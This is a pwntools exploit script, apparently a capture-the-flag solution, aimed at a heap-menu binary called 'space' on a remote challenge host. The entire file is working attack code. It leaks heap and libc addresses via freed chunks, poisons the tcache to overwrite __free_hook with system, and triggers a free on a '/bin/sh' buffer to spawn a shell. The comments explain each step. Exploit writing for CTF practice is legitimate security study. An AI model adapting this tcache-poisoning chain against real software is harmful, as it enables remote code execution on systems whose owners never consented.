from pwn import *

libc = ELF("./libc-2.27.so")
e = ELF("./space")
if args.LOCAL:
    p = e.process()
    libc = e.libc
else:
    p = remote('jh2i.com', 50016)
def cleanup():
    p.recvuntil(b"> ")
    if p.can_recv():
        p.sendline("n")
        p.recvuntil(b"> ")
def alloc(firstname=b"a",lastname=b"b",expiry=None,commentsize=None,comment=b"c"):
    if type(expiry) == bytes:
        expiry = {"year":0,"day":0,"month":expiry}
    p.sendline("1")
    p.sendlineafter(b"first name: ",firstname)
    p.sendlineafter(b"last name: ", lastname)
    p.recvuntil(b": ")
    if expiry:
            p.sendline("y")
            p.sendlineafter(b": ",str(expiry["year"]))
            p.sendlineafter(b": ",expiry["month"])
            p.sendlineafter(b": ",str(expiry["day"]))
    else:
        p.sendline("n")
    p.recvuntil(b": ")
    if commentsize:
        p.sendline("y")
        p.sendlineafter(b": ",str(commentsize))
        p.recvline()
        p.sendline(comment)
    else:
        p.sendline("n")
    p.sendline("n")
    cleanup()
def printacc(uid):
    ans = []
    # Returns [uid,firstname,lastname]
    p.sendline("3")
    p.sendlineafter(b": ",str(uid))
    p.recvuntil(b"Account uid: ")
    ans.append(int(p.recvline()))
    p.recvuntil(b"First name: ")
    ans.append(p.recvline())
    p.recvuntil(b"Last name: ")
    ans.append(p.recvline())
    p.sendlineafter(b": ","n")
    cleanup()
    return ans
def getexpiry(uid,proper=False):
    # Returns expiry [day,year] OR the year
    p.sendline("2")
    p.recvuntil(f"Account uid: {uid}\n")
    if not proper:
        p.recvuntil(b"Account expires on  ")
        ans = [int(x) for x in p.recvline().split(b",")]
    else:
        p.recvuntil(b"Account expires on ")
        ans = p.recvuntil(b" ")[:-1]
    p.sendlineafter(b": ","n")
    cleanup()
    return ans
def free():
    p.sendline("4")
    p.sendlineafter(b": ","n")
    cleanup()
def convtwos(num):
    if abs(num) == num:
        return num
    sum1 = abs(num) + (1<<31)
    sum1 -= 1
    sum2 = sum1 ^ 0xffffffff
    return sum2 + (1<<31)
def reconstruct(arr):
    #Reconstructs 64-bit number from 2 32-bit numbers
    # First number is LSB, second is MSB
    return (arr[1] << 32) + convtwos(arr[0])
heapoffset = 0x360
unsorted = 0x410
exproffset = 0x268
mainarena = 0x3ebca0
p.recvuntil(b"> ")
alloc()
alloc()
free()
free()
print(printacc(0))
alloc()
leak = reconstruct(getexpiry(0))
print(getexpiry(0))
log.info(F"Heap leak: {hex(leak)}")
heapbase = leak - heapoffset
log.info(F"Heap base: {hex(heapbase)}")
alloc() # 1
for _ in range(8):
    alloc(commentsize=0xe0) # 2-9
for _ in range(8):
    free()
# Chunk 2 is in the unsorted bin, fitted with libc pointers. These pointers we want to leak
# First we need to calculate their address
unsortedaddr = heapbase + unsorted
# Now we begin the tcache poisoning process
# We allocate a chunk with no comment, and use it to poison
# After 16 bytes, the next 8 bytes become the size(we just write this to 0xf1) and the next 8 bytes the tcache next pointer
# We set the next pointer to the expiry pointer of chunk 0
expiry = heapbase + exproffset
padding = b'a'*16
payload = padding + p64(0xf1) + p64(expiry)
alloc(expiry=payload)  # 2
alloc(commentsize=0xe0) # 3
alloc(commentsize=0xe0,comment=p64(unsortedaddr)) # 4
libcleak = u64(getexpiry(0,proper=True).ljust(8,b'\x00'))
log.info(f"Libc leak: {hex(libcleak)}")
libc.address = libcleak - mainarena
log.info(f"Libc base: {hex(libc.address)}")
freehook = libc.symbols['__free_hook']
alloc(commentsize=0x60) #5
alloc(commentsize=0x10) #6
alloc(commentsize=0x10) #7
alloc(commentsize=0xc0) #8
# We can finally do away with the old part of the heap
alloc(commentsize=0xf0) #9
free()
payload = padding + p64(0x101) + p64(freehook - 8)
alloc(expiry=payload) #9
free()
alloc(commentsize=0xf0) #9
alloc(commentsize=0xf0,comment=b"/bin/sh\x00" + p64(libc.symbols['system'])) #10
p.sendline("4")
p.interactive()
